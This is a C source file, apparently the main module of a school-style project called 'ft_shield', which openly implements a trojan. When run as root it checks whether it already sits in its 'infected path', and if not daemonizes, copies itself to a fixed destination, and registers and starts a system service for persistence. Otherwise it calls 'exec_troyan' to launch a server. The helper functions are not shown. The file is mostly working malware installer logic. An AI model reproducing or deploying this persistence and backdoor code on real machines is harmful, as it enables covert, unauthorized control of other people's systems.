#include "ft_shield.h"

char path[PATH_MAX] = {0};
char dir_name[PATH_MAX] = {0};

bool	find_dir(char *dirname)
{
	char	*exec_paths = getenv("PATH");
	char	*location = strnstr(exec_paths, dirname, -1);

	if (location != NULL) {
		ft_dprintf(2, "found [%s]\n", location);
		return (true);
	}
	return (false);
}

bool	need_to_install_server(void)
{
	if (find_own_path(path, sizeof(path)) == -1) {
		ft_dprintf(2, "can't find own executable\n");
		exit(1);
	}

	memmove(dir_name, path, sizeof(path));
	dirname(dir_name);
	ft_dprintf(2, "dir_name: [%s]\n", dir_name);
	if (find_dir(dir_name) == true) {
		ft_dprintf(2, "We are already in the infected path: [%s]\n", dir_name);
		return (false);
	}
	ft_dprintf(2, "we need to install the server: [%s]\n", path);
	return (true);
}

void	install_server()
{
	daemon(1, 1);
	copy_file(path, DEST_PATH);
	create_service();
	start_service();
}

void	exec_troyan()
{
	// daemon(1, 0);
	t_server server;

	memset(&server, 0, sizeof(t_server));
	ft_server(&server);
}

int main(void)
{
	if (geteuid() != 0) {
		ft_dprintf(2, "Error: not running as root\n");
		return (1);
	}
	if (need_to_install_server()) {
		install_server();
	} else {
		exec_troyan();
	}
	return (0);
}


/*
while daemon(1, 0) is enabled, stop server with
kill -9 $(ps -aux | grep ./ft_shield | grep -v exclude | cut -d' ' -f2)
*/